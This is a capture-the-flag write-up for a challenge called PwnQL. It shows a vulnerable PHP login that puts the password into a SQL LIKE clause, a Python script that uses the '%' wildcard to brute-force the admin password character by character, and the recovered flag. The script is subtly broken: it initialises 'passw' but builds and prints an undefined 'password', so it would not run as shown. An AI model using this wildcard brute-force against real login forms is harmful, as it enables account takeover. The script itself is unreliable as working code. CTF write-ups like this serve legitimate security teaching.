## Description

![image](https://user-images.githubusercontent.com/65862031/116080678-ffc08d80-a6b6-11eb-8914-175f28675a64.png)

#### This challenge is the second part of PwnQL series and we need to extract the password for admin.
#### The code is same as that of before.


### PHP Code:

```
<?php

require_once(__DIR__  . "/config.php");

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
    $sth = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
    $sth->execute(array(':username' => $username, ':password' => $password));
    $users = $sth->fetchAll();

    if (count($users) === 1) {
        $msg = 'Welcome back admin ! Here is your flag : ' . FLAG;
    } else {
        $msg = 'Wrong username or password.';
    }
}

```
Exploit script

```
#!/usr/bin/env python

import requests
from time import sleep

url = "http://chall1.heroctf.fr:8080/index.php"
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz@!_"
passw = "S"
for i in range(20):
    for c in chars:
        payload = {
            "username":"admin",
            "password":"{}%".format(password + c)
            }
        sleep(0.5) # Not to overwhelm the server
        res = requests.post(url,data=payload)
        if "Here is your flag" in res.text:
            password += c
            break
        else:
            pass
print "Pass found: {}".format(password)
```
Flag : Hero{S3CUR3P@SS}
